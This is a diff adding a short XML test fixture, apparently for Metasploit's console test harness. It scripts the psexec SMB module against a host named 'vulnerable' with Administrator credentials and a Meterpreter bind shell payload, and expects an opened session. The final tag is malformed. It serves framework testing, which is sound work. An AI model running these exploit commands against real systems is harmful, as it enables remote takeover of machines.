@@ -1,0 +1,31 @@
+<xml>
+<msf_test>
+	<name>
+		psexec
+	</name>
+	<description>
+		This test runs psexec on a vulnerable host.
+	</description>
+	<commands>
+		use windows/smb/psexec
+		set WORKSPACE default
+		set RHOST vulnerable
+		set SMBUser Administrator
+		set SMBPass 
+		set payload windows/meterpreter/bind_tcp
+		set LocalOutput msfconsole_spec_working/output/psexec
+		exploit
+		exit
+		exit
+	</commands>
+	<output>
+		<successes>
+			<success>Meterpreter session 1 opened</success>	
+			<success>Meterpreter session 1 closed.  Reason: User exit</success>
+		</successes>
+		<failures>
+		</failures>
+		<failure_exceptions>
+		</failure_exceptions>
+	</output>
+<msf_test>
